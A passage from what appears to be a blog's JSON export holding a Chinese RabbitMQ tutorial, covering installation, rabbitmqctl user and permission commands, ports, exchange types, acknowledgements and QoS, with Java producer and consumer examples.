sc.nextLine();\n\t\tsc.close();\n\t\t\n\t\tchannel.queueDeclare(queueName, false, false, false, null);\n\t\tchannel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.FANOUT);\n\t\tchannel.queueBind(queueName, EXCHANGE_NAME, ROUTING_KEY);\n\t\t\n\t\tSystem.out.println(\" [*] Waiting for messages. To exit press CTRL+C\");\n\t\t\n\t\tCountDownLatch cdl = new CountDownLatch(3);\n\t\tDeliverCallback deliverCallback = (consumerTag, delivery) -> {\n            String message = new String(delivery.getBody(), \"UTF-8\");\n            \n            System.out.println(\" [x] Received '\" + message + \"'\");\n            cdl.countDown();\n        };\n        channel.basicConsume(queueName, true, deliverCallback, consumerTag -> { });\n\n        \n        cdl.await();\n        closeConnection(channel);\n\t}\n}\n```\n\n","slug":"rabbitmq","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi07k002xg0uknlwwmuix","content":"<h2 id=\"1-安装\"><a href=\"#1-安装\" class=\"headerlink\" title=\"1. 安装\"></a>1. 安装</h2><p>使用docker方式，拉取镜像uetty/rabbitmq</p>\n<p>具体Dockerfile的命令 -&gt; <a href=\"https://github.com/Uetty/dockerfile/blob/master/docker-rabbitmq/Dockerfile\" target=\"_blank\" rel=\"noopener\">Dockerfile</a></p>\n<p>额外的TIP: 由于Linux机器上会有最大打开文件个数限制，Rabbitmq又依赖文件操作，所以应将Linux的所有用户打开文件限制调高到64000，Rabbitmq程序所属的用户的打开文件限制调高到64000，这一块见官网（<a href=\"https://www.rabbitmq.com/install-debian.html#kernel-resource-limits\" target=\"_blank\" rel=\"noopener\">文件限制</a>）</p>\n<h2 id=\"2-虚拟主机\"><a href=\"#2-虚拟主机\" class=\"headerlink\" title=\"2. 虚拟主机\"></a>2. 虚拟主机</h2><p>Rabbitmq是多租户系统，存在虚拟主机（把它想象成为数据库）的概念，用户对它的连接、队列、绑定、路由等操作是基于虚拟主机上的。通过<code>rabbitmqctl add_vhost vhostname</code>命令来增加虚拟主机，<code>rabbitmqctl delete_vhost vhostname</code>命令来删除虚拟主机，<code>rabbitmqctl list_vhosts [name tracing]</code>命令来显示虚拟主机列表。</p>\n<p>设置虚拟主机并发客户端总数：<code>rabbitmqctl set_vhost_limits -p test &#39;{&quot;max-connections&quot;: 256}&#39;</code></p>\n<p>设置虚拟主机最大队列数：<code>rabbitmqctl set_vhost_limits -p test &#39;{&quot;max-queues&quot;: 1024}&#39;</code></p>\n<p>显示虚拟主机参数：<code>rabbitmqctl list_vhost_limits -p test</code></p>\n<h2 id=\"3-启动与用户操作及权限\"><a href=\"#3-启动与用户操作及权限\" class=\"headerlink\" title=\"3. 启动与用户操作及权限\"></a>3. 启动与用户操作及权限</h2><p>启动命令：<code>service rabbitmq-server start</code>  </p>\n<p>Rabbit提供了用户名密码的方式认证和X509证书的方式认证，，这里只记用户名密码的方式 </p>\n<p>初始用户：刚创建的实例，有默认的用户guest密码guest，但只能在本机登陆（不鼓励将其配置成能远程登陆，其他用户默认是可以远程访问的） </p>\n<h3 id=\"用户设置（官网地址-）\"><a href=\"#用户设置（官网地址-）\" class=\"headerlink\" title=\"用户设置（官网地址 ）\"></a>用户设置（<a href=\"https://www.rabbitmq.com/rabbitmqctl.8.html#User_Management\" target=\"_blank\" rel=\"noopener\">官网地址</a> ）</h3><p>添加用户：<code>rabbitmqctl add_user janeway changeit</code> </p>\n<p>删除用户：<code>rabbitmqctl delete_user janeway</code> </p>\n<p>变更密码：<code>rabbitmqctl change_password janeway newpass</code> </p>\n<p>验证用户名密码：<code>rabbitmqctl authenticate_user janeway verifyit</code> </p>\n<p>显示用户列表：<code>rabbitmqctl list_users</code> </p>\n<h3 id=\"用户权限\"><a href=\"#用户权限\" class=\"headerlink\" title=\"用户权限\"></a>用户权限</h3><p>设置用户TAG：<code>rabbitmqctl set_user_tags janeway administrator</code> </p>\n<p>删除用户TAG：<code>rabbitmqctl set_user_tags janeway</code> </p>\n<p>TIP: 用户TAG与全局权限绑定（包括登陆可视化管理界面的权限等），具体见官网（<a href=\"https://www.rabbitmq.com/management.html#permissions\" target=\"_blank\" rel=\"noopener\">TAG权限表</a>）</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Tag</th>\n<th align=\"left\">Capabilities</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">(None)</td>\n<td align=\"left\">No access to the management plugin</td>\n</tr>\n<tr>\n<td align=\"left\">management</td>\n<td align=\"left\">Anything the user could do via messaging protocols plus:List virtual hosts to which they can log in via AMQPView all queues, exchanges and bindings in “their” virtual hostsView and close their own channels and connectionsView “global” statistics covering all their virtual hosts, including activity by other users within them</td>\n</tr>\n<tr>\n<td align=\"left\">policymaker</td>\n<td align=\"left\">Everything “management” can plus:View, create and delete policies and parameters for virtual hosts to which they can log in via AMQP</td>\n</tr>\n<tr>\n<td align=\"left\">monitoring</td>\n<td align=\"left\">Everything “management” can plus:List all virtual hosts, including ones they could not access using messaging protocolsView other users’s connections and channelsView node-level data such as memory use and clusteringView truly global statistics for all virtual hosts</td>\n</tr>\n<tr>\n<td align=\"left\">administrator</td>\n<td align=\"left\">Everything “policymaker” and “monitoring” can plus:Create and delete virtual hostsView, create and delete usersView, create and delete permissionsClose other users’s connections</td>\n</tr>\n</tbody></table>\n<p>设置用户在虚拟主机上的权限：<code>rabbitmqctl set_permissions -p vhostname username &quot;.*&quot; &quot;.*&quot; &quot;.*&quot;</code> 后面三个参数分别表示配置权限、写权限、读权限，引号内的内容用正则表达式匹配队列键名（不指定[–vhost/-p]参数，默认主机为’/‘ ，下同） </p>\n<p>清除用户在虚拟主机上的权限：<code>rabbitmqctl clear_permissions -p vhostname username</code>  </p>\n<p>显示某个用户在虚拟主机上的权限：<code>rabbitmqctl list_user_permissions uetty</code>  </p>\n<p>显示某个虚拟主机上的用户权限：<code>rabbitmqctl list_permissions -p vhostname</code></p>\n<h2 id=\"4-端口介绍\"><a href=\"#4-端口介绍\" class=\"headerlink\" title=\"4. 端口介绍\"></a>4. 端口介绍</h2><ul>\n<li>4369: <a href=\"http://erlang.org/doc/man/epmd.html\" target=\"_blank\" rel=\"noopener\">epmd</a>, a peer discovery service used by RabbitMQ nodes and CLI tools</li>\n<li>5672, 5671: used by AMQP 0-9-1 and 1.0 clients without and with TLS</li>\n<li>25672: used for inter-node and CLI tools communication (Erlang distribution server port) and is allocated from a dynamic range (limited to a single port by default, computed as AMQP port + 20000). Unless external connections on these ports are really necessary (e.g. the cluster uses <a href=\"https://www.rabbitmq.com/federation.html\" target=\"_blank\" rel=\"noopener\">federation</a> or CLI tools are used on machines outside the subnet), these ports should not be publicly exposed. See <a href=\"https://www.rabbitmq.com/networking.html\" target=\"_blank\" rel=\"noopener\">networking guide</a> for details.</li>\n<li>35672-35682: used by CLI tools (Erlang distribution client ports) for communication with nodes and is allocated from a dynamic range (computed as server distribution port + 10000 through server distribution port + 10010). See <a href=\"https://www.rabbitmq.com/networking.html\" target=\"_blank\" rel=\"noopener\">networking guide</a> for details.</li>\n<li>15672: <a href=\"https://www.rabbitmq.com/management.html\" target=\"_blank\" rel=\"noopener\">HTTP API</a> clients, <a href=\"https://www.rabbitmq.com/management.html\" target=\"_blank\" rel=\"noopener\">management UI</a> and <a href=\"https://www.rabbitmq.com/management-cli.html\" target=\"_blank\" rel=\"noopener\">rabbitmqadmin</a> (only if the <a href=\"https://www.rabbitmq.com/management.html\" target=\"_blank\" rel=\"noopener\">management plugin</a> is enabled)</li>\n<li>61613, 61614: <a href=\"https://stomp.github.io/stomp-specification-1.2.html\" target=\"_blank\" rel=\"noopener\">STOMP clients</a> without and with TLS (only if the <a href=\"https://www.rabbitmq.com/stomp.html\" target=\"_blank\" rel=\"noopener\">STOMP plugin</a> is enabled)</li>\n<li>1883, 8883: (<a href=\"http://mqtt.org/\" target=\"_blank\" rel=\"noopener\">MQTT clients</a> without and with TLS, if the <a href=\"https://www.rabbitmq.com/mqtt.html\" target=\"_blank\" rel=\"noopener\">MQTT plugin</a> is enabled</li>\n<li>15674: STOMP-over-WebSockets clients (only if the <a href=\"https://www.rabbitmq.com/web-stomp.html\" target=\"_blank\" rel=\"noopener\">Web STOMP plugin</a> is enabled)</li>\n<li>15675: MQTT-over-WebSockets clients (only if the <a href=\"https://www.rabbitmq.com/web-mqtt.html\" target=\"_blank\" rel=\"noopener\">Web MQTT plugin</a> is enabled)</li>\n</ul>\n<p>5671端口：AMQP协议使用，且TLS加密</p>\n<p>5672端口：AMQP协议使用，且不加密</p>\n<p>15672端口：HTTP协议使用，或者开启可视化管理页面后，页面地址所在端口</p>\n<p>61613端口：STOMP协议使用，且不加密</p>\n<p>61614端口：STOMP协议使用，且TLS加密</p>\n<p>1883端口：MQTT协议使用，且不加密</p>\n<p>8883端口：MQTT协议使用，且TLS加密</p>\n<p>15674端口：Websocket协议上的STOMP协议使用</p>\n<p>15675端口：Websocket协议上的MQTT协议使用</p>\n<p>TIP:  较常用的是5672端口（一般选择AMQP协议，有加密需求的化是5671端口）和15672端口</p>\n<h2 id=\"5-交换机、队列与消息的路由\"><a href=\"#5-交换机、队列与消息的路由\" class=\"headerlink\" title=\"5. 交换机、队列与消息的路由\"></a>5. 交换机、队列与消息的路由</h2><p>在Rabbitmq中，生产者是将消息推送到交换机里，交换机负责将消息路由到队列中，消费者再从队列中消费消息。这里涉及到了两个概念，<code>交换机</code>和<code>队列</code>，在此基础上引申出了三个操作：<code>交换机的声明</code>、<code>队列的声明</code>、<code>交换机和队列绑定的声明</code>，这三个操作的完成是基于<code>交换机名</code>、<code>队列名</code>、<code>路由键</code>这三个属性的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1) 通过channel.exchangeDeclare(&quot;exchangeName&quot;, BuiltinExchangeType.类型);声明交换机</span><br><span class=\"line\">2) 通过String queueName = channel.queueDeclare().getQueue();声明队列，并返回自动生成的队列的名称</span><br><span class=\"line\">   也可以通过channel.queueDeclare(queueName, durable, exclusive, autoDelete, arguments);声明命名的队列</span><br><span class=\"line\">   第二种声明方式的参数解释：durable为是否持久化到磁盘，它将使服务器重启后数据仍然存在；exclusive为是否排他队列，具有基于连接的排他性；autoDelete是否自动删除，在没有订阅者的情况下是否自动删除</span><br><span class=\"line\">3) 通过channel.queueBind(queueName, &quot;exchangeName&quot;, &quot;routingKey&quot;);绑定队列和交换机</span><br></pre></td></tr></table></figure>\n\n<p>TIP:  队列本身还包含了许多属性，例如：名称、交换代理重启后是否仍保存、自动删除、队列长度等参数，在声明队列的时候可以给定。</p>\n<p>交换机种类主要有四种，以下介绍这几种交换机：</p>\n<ol>\n<li>直连交换机(direct)</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在直连交换机的三个声明操作中，交换机名、队列名都是不能为空字符串，路由键可以为空字符串但已被使用。发送到直连交换机的消息直接根据路由键进行完全匹配，将消息路由到所有以该路由键与该交换机绑定的队列中。</span><br><span class=\"line\"></span><br><span class=\"line\">1) 生产者通过channel.basicPublish(&quot;exchangeName&quot;, routingKey, null, message.getBytes(&quot;UTF-8&quot;));提交数据到Rabbitmq</span><br><span class=\"line\"></span><br><span class=\"line\">2) 消费者通过channel.basicConsume(queueName, true, (consumerTag, delivery) -&gt; &#123;&#125;, consumerTag -&gt; &#123; &#125;);从Rabbitmq消费消息</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>扇形交换机(fanout)</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">该交换机的设计思想是一个消息广播，在扇形交换机的三个声明操作中，路由键名可以为空字符串（事实上它会被忽略）。发送到扇形交换机的消息，会被路由到所有绑定在该交换机上的队列中（与直连交换机不同的是不再根据路由键进行筛选）。</span><br><span class=\"line\"></span><br><span class=\"line\">1) 生产者通过channel.basicPublish(&quot;exchangeName&quot;, &quot;&quot;, null, message.getBytes(&quot;UTF-8&quot;));提交数据到Rabbitmq</span><br><span class=\"line\"></span><br><span class=\"line\">2) 消费者通过channel.basicConsume(queueName, true, (consumerTag, delivery) -&gt; &#123;&#125;, consumerTag -&gt; &#123; &#125;);从Rabbitmq消费消息</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>主题交换机(topic)</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在主题交换机的三个声明中，路由键的命名是受限制的，必须由点号分割的多个单词或星号或井号组成，*用于匹配一个单词，井号用于匹配零到多个单词，发送到主题交换机的消息，会根据路由键匹配来路由到队列中。</span><br><span class=\"line\"></span><br><span class=\"line\">1) 生产者通过channel.basicPublish(EXCHANGE_NAME, routingKey, null, message.getBytes(&quot;UTF-8&quot;));发送数据到Rabbitmq</span><br><span class=\"line\"></span><br><span class=\"line\">2) 消费者通过channel.basicConsume(queueName, true, (consumerTag, delivery) -&gt; &#123;&#125;, consumerTag -&gt; &#123; &#125;);从Rabbitmq消费消息</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>首部交换机(match 和 headers)</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在首部交换机中，路由键名可以是空字符串（事实上它会被忽略），它的路由规则转而由首部属性决定，其中最重要的一个属性是x-match，该属性有两个取值（any/all）,any表示发布消息时携带的键值对有一对能匹配上队列定义的其中一个就能，all表示所有的键值对需完全匹配。另外以x-开头的属性不被视作用于路由匹配的属性。</span><br><span class=\"line\">该模式下，交换机和队列绑定需要增加headers值，可通过如下设置：</span><br><span class=\"line\">Map&lt;String, Object&gt; arguments = new HashMap&lt;String, Object&gt;();</span><br><span class=\"line\">arguments.put(&quot;x-match&quot;, &quot;any&quot;);</span><br><span class=\"line\">arguments.put(&quot;arg1&quot;, &quot;a1&quot;);</span><br><span class=\"line\">arguments.put(&quot;latitude&quot;, 51.5252949);</span><br><span class=\"line\">arguments.put(&quot;dataType&quot;, &quot;json&quot;);</span><br><span class=\"line\">channel.queueBind(queueName, EXCHANGE_NAME, &quot;&quot;, arguments);</span><br><span class=\"line\"></span><br><span class=\"line\">使用：</span><br><span class=\"line\">1) 生产者通过如下代码发送消息到Rabbitmq</span><br><span class=\"line\">Map&lt;String, Object&gt; headers = new HashMap&lt;String, Object&gt;();</span><br><span class=\"line\">headers.put(&quot;latitude&quot;,  51.5252949);</span><br><span class=\"line\">headers.put(&quot;longitude&quot;, -0.0905493);</span><br><span class=\"line\">channel.basicPublish(exchangeName, &quot;&quot;,</span><br><span class=\"line\">             new AMQP.BasicProperties.Builder()</span><br><span class=\"line\">               .headers(headers)</span><br><span class=\"line\">               .build(),</span><br><span class=\"line\">               message.getBytes(&quot;UTF-8&quot;));</span><br><span class=\"line\">               </span><br><span class=\"line\">2) 消费者通过channel.basicConsume(queueName, true, (consumerTag, delivery) -&gt; &#123;&#125;, consumerTag -&gt; &#123; &#125;);从Rabbitmq消费消息</span><br></pre></td></tr></table></figure>\n\n<p>默认交换机规则是一个空字符串路由键的直连交换机定义<a href=\"https://www.rabbitmq.com/tutorials/amqp-concepts.html#exchange-default\" target=\"_blank\" rel=\"noopener\">官网</a>，该交换机的路由键与队列键名相同，这使其看起来像是客户端直接提交消息到了队列中。所有新建的队列都天生绑定了这个默认交换机，它的存在也方便了一些简单需求的应用直接使用Rabbitmq。</p>\n<h2 id=\"6-ACK、TRANSACTION、RECOVERY和QOS\"><a href=\"#6-ACK、TRANSACTION、RECOVERY和QOS\" class=\"headerlink\" title=\"6. ACK、TRANSACTION、RECOVERY和QOS\"></a>6. ACK、TRANSACTION、RECOVERY和QOS</h2><h3 id=\"ACK、TRANSACTION和RECOVERY\"><a href=\"#ACK、TRANSACTION和RECOVERY\" class=\"headerlink\" title=\"ACK、TRANSACTION和RECOVERY\"></a>ACK、TRANSACTION和RECOVERY</h3><p>​        消费者消费队列消息时，过程中可能由于网络原因或业务原因，出现连接断开或者消费者未接收到消息或者消费者不能成功处理消息，这个时候可能会导致数据的丢失。基于这一点，Rabbitmq提供了，TRANSACRION机制、ACK机制和RECOVERY机制。</p>\n<p>​        RECOVERY机制：Rabbitmq JAVA客户端提供连接恢复的功能，在启用该功能时，当客户端由于网络问题断开，会自动恢复客户端，包括恢复连接、恢复连接监听器、重新打开信道及监听器、恢复QOS设置、重新声明交换机、重新声明队列、恢复绑定和消费者，可以通过<code>factory.setAutomaticRecoveryEnabled(true)</code>来打开RECOVERY机制。</p>\n<p>​        ACK机制：Rabbitmq提供了交付确认机制，可以设定自动确认交付和手动确认交付。消费者消费消息时的<code>channel.basicConsume</code>方法，第二个参数<code>autoAck</code>为<code>true</code>时表示自动确认交付，为<code>false</code>时表示手动确认交付。自动确认交付模式下，消费者从队列消费消息时立即确认交付，这时队列中立即完全删除该消息。手动确认交付模式下，客户端需告诉服务端是否确认交付，共有三种交付状态：ACK、NACK、REJECT，当客户端发送ACK时表示客户端处理成功，这时Rabbitmq才会完全删除，ACK的调用为<code>channel.basicAck(deliveryTag, false)</code>。当客户端发送NACK和REJECT时均表示交付失败，区别时NACK能批量操作，REJECT的调用为<code>channel.basicReject(deliveryTag, false)</code>，NACK的调用为<code>channel.basicNack(deliveryTag, true, true)</code>，NACK和REJECT的最后一个参数均表示交付失败的是否重新进入队列，ACK和NACK的第二个参数均表示是否包含所有未回复的交付（即是否批量回复）。</p>\n<p>​        TRANSACTION机制：Rabbitmq在AMQP协议下提供了事务机制，客户端使用<code>channel.txSelect()</code>方法开启事务，使用<code>channel.txCommit()</code>方法提交事务，使用<code>channel.txRollback()</code>方法回滚事务。该机制是重量级的，并且不是必要的，根据官网的说法，它将导致吞吐量降低250倍，因此官方后面添加了也能保证数据不丢失的ACK机制。</p>\n<h3 id=\"QOS\"><a href=\"#QOS\" class=\"headerlink\" title=\"QOS\"></a>QOS</h3><p>默认情况下，消费者一次会尽可能多的消费消息（根据客户端内存），设置QOS可以指定一次最高的消费量，可以使用<code>channel.basicQos(prefetchCount)</code>方法来设置。</p>\n<h2 id=\"7-可视化界面\"><a href=\"#7-可视化界面\" class=\"headerlink\" title=\"7. 可视化界面\"></a>7. 可视化界面</h2><p><code>rabbitmq-plugins enable rabbitmq_management</code>命令用于开启可视化管理界面，之后添加有该权限的用户即可访问15672端口使用 </p>\n<h2 id=\"8-JAVA访问测试\"><a href=\"#8-JAVA访问测试\" class=\"headerlink\" title=\"8. JAVA访问测试\"></a>8. JAVA访问测试</h2><p>POM依赖</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;com.rabbitmq&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;amqp-client&lt;/artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;5.6.0&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"简单HelloWorld\"><a href=\"#简单HelloWorld\" class=\"headerlink\" title=\"简单HelloWorld\"></a>简单HelloWorld</h3><p>基于默认交换机，且不设QOS</p>\n<p>生产者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import com.rabbitmq.client.Channel;</span><br><span class=\"line\">import com.rabbitmq.client.Connection;</span><br><span class=\"line\">import com.rabbitmq.client.ConnectionFactory;</span><br><span class=\"line\">public class Send &#123;</span><br><span class=\"line\">    private final static String QUEUE_NAME = &quot;hello&quot;,</span><br><span class=\"line\">\t\t\tROUTING_KEY = QUEUE_NAME;</span><br><span class=\"line\">\tprivate static ConnectionFactory factory;</span><br><span class=\"line\">\tprivate static Connection conn;</span><br><span class=\"line\">\tprivate static synchronized Channel createConnectChannel() &#123;</span><br><span class=\"line\">\t\tif (factory == null) &#123;</span><br><span class=\"line\">\t\t\tfactory = new ConnectionFactory();</span><br><span class=\"line\">\t\t\tfactory.setHost(&quot;118.25.54.197&quot;);</span><br><span class=\"line\">\t\t\tfactory.setVirtualHost(&quot;test&quot;);</span><br><span class=\"line\">\t\t\tfactory.setUsername(System.getProperty(&quot;username&quot;));</span><br><span class=\"line\">\t\t\tfactory.setPassword(System.getProperty(&quot;password&quot;));</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tif (conn == null) &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tconn = factory.newConnection();</span><br><span class=\"line\">\t\t\t&#125; catch(Exception e) &#123;</span><br><span class=\"line\">\t\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\ttry &#123;</span><br><span class=\"line\">\t\t\tChannel channel = conn.createChannel();</span><br><span class=\"line\">\t\t\treturn channel;</span><br><span class=\"line\">\t\t&#125; catch (Exception e) &#123;</span><br><span class=\"line\">\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tthrow new RuntimeException(&quot;create failed&quot;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tprivate static void closeChannel(Channel channel) &#123;</span><br><span class=\"line\">\t\tif (channel == null || !channel.isOpen()) return;</span><br><span class=\"line\">\t\tsynchronized (channel) &#123;</span><br><span class=\"line\">\t\t\tif (channel.isOpen()) &#123;</span><br><span class=\"line\">\t\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\t\tchannel.close();</span><br><span class=\"line\">\t\t\t\t&#125; catch (IOException e) &#123;</span><br><span class=\"line\">\t\t\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t\t\t&#125; catch (TimeoutException e) &#123;</span><br><span class=\"line\">\t\t\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tprivate static synchronized void closeConnection(Channel channel) &#123;</span><br><span class=\"line\">\t\tcloseChannel(channel);</span><br><span class=\"line\">\t\tif (conn != null &amp;&amp; conn.isOpen()) &#123;</span><br><span class=\"line\">\t\t\tsynchronized (conn) &#123;</span><br><span class=\"line\">\t\t\t\tif (conn != null &amp;&amp; conn.isOpen()) &#123;</span><br><span class=\"line\">\t\t\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\t\t\tconn.close();</span><br><span class=\"line\">\t\t\t\t\t\tconn = null;</span><br><span class=\"line\">\t\t\t\t\t&#125; catch (IOException e) &#123;</span><br><span class=\"line\">\t\t\t\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    public static void main(String[] argv) throws Exception &#123;</span><br><span class=\"line\">        Channel channel = createConnectChannel();</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tchannel.queueDeclare(QUEUE_NAME, false, false, false, null);</span><br><span class=\"line\">\t\tSystem.out.println(declare);</span><br><span class=\"line\">\t\tString message = &quot;Hello World...&quot;;</span><br><span class=\"line\">\t\tchannel.basicPublish(&quot;&quot;, ROUTING_KEY, null, message.getBytes());</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tSystem.out.println(&quot; [x] Sent &apos;&quot; + message + &quot;&apos;&quot;);</span><br><span class=\"line\">\t\tcloseConnection(channel);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>消费者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import com.rabbitmq.client.Channel;</span><br><span class=\"line\">import com.rabbitmq.client.Connection;</span><br><span class=\"line\">import com.rabbitmq.client.ConnectionFactory;</span><br><span class=\"line\">import com.rabbitmq.client.DeliverCallback;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Recv &#123;</span><br><span class=\"line\">    private final static String QUEUE_NAME = &quot;hello&quot;;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    public static void main(String[] argv) throws Exception &#123;</span><br><span class=\"line\">        Channel channel = createConnectChannel();</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tchannel.queueDeclare(QUEUE_NAME, false, false, false, null);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tSystem.out.println(&quot; [*] Waiting for messages. To exit press CTRL+C&quot;);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tCountDownLatch cdl = new CountDownLatch(1);</span><br><span class=\"line\">\t\tDeliverCallback deliverCallback = (consumerTag, delivery) -&gt; &#123;</span><br><span class=\"line\">            String message = new String(delivery.getBody(), &quot;UTF-8&quot;);</span><br><span class=\"line\">            System.out.println(&quot; [x] Received &apos;&quot; + message + &quot;&apos;&quot;);</span><br><span class=\"line\">            cdl.countDown();</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        channel.basicConsume(QUEUE_NAME, true, deliverCallback, consumerTag -&gt; &#123; &#125;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        cdl.await();</span><br><span class=\"line\">        closeConnection(channel);</span><br><span class=\"line\">    